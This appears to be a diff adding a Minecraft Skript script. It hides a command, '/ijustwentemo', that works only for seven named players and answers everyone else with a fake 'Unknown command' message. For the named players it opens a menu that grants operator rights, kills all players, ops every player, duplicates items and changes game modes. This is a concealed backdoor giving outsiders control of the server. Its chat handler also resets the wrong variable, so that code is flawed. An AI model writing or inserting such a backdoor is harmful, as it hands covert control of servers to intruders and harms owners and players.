@@ -1,0 +1,53 @@
+command /ijustwentemo:
+  trigger:
+    if player is "BEEB0" or "HeisenbergFan69" or "Ganyuuki" or "aaa1a" or "vkxe" or "kaigg2" or "AlwaysNotify":
+      send player title "&c&lAtlas" with subtitle "&c&lWelcome %player%." for 3 seconds
+      wait 3 seconds
+      create a gui with virtual chest inventory with 5 rows named "&c&lAtlas"
+      open the created gui for player
+      edit gui last gui:
+        make gui 4 with red dye named "&c&lGIVE ITEM":
+          close player's inventory
+          set {givegui.%player's uuid%} to true
+          send "&4&l[Atlas] &fWhat item would you like?"
+        make gui 10 with golden sword named "&e&lCREATIVE MODE":
+          set player's gamemode to creative
+        make gui 12 with grass block named "&a&lSURVIVAL MODE":
+          set player's gamemode to survival
+        make gui 14 with barrier named "&c&lSPECTATOR MODE":
+          set player's gamemode to spectator
+        make gui 16 with stick named "&2&lGIVE 64 OF HELD ITEM":
+          set {_item} to player's tool
+          give 64 of {_item} to player
+        make gui 28 with wither skeleton skull named "&f&lKILL ALL PLAYERS":
+          loop all players:
+            execute console command "/kill %loop-players%"
+        make gui 30 with bowl named "&3&lDUPE HELD ITEM":
+          set {_item} to player's tool
+          give {_item} to player
+        make gui 32 with totem of undying named "&4&lOP YOURSELF" with lore "&4WARNING: This command shows in console / logs.":
+          execute console command "/op %player%"
+        make gui 34 with diamond named "&c&lOP EVERY PLAYER" with lore "&4WARNING: This command shows in console / logs.":
+          if player is "BEEB0":
+            loop all players:
+              execute console command "/op %loop-players%"
+              send loop-players title "&c&lWe do a little trolling!" with subtitle "&cGo bonkers" for 3 seconds
+          else:
+            send "no you arent worthy"
+        make gui 40 with totem of undying named "&e&lGIVE TOTEM":
+          give 1 of totem of undying to player
+        make gui 42 with wooden sword named "&8&lGIVE ALL PLAYERS DEMO SCREEN":
+          show demo screen to all players
+        make gui 0 and 2 and 6 and 8 and 18 and 20 and 22 and 24 and 26 and 36 and 38 and 44 with light blue stained glass pane named "&b&k&llol"
+        make gui 1 and 3 and 5 and 7 and 9 and 11 and 13 and 15 and 17 and 19 and 21 and 23 and 25 and 27 and 29 and 31 and 33 and 35 and 37 and 39 and 41 and 43 with cyan stained glass pane named "&3&k&llol"
+    else:
+      send "&cUnknown command"
+      send "&cijustwentemo<--&o[HERE]"
+
+on chat:
+  if {givegui.%player's uuid%} is true:
+    cancel event
+    set {giveitem.%player%} to message parsed as items
+    give 64 of {giveitem.%player%} to player
+    set {give.%player's uuid%} to false
+    send "&4&l[Atlas] &fGave 64 of &4%{giveitem.%player%}% &fto &4%player%&f!"
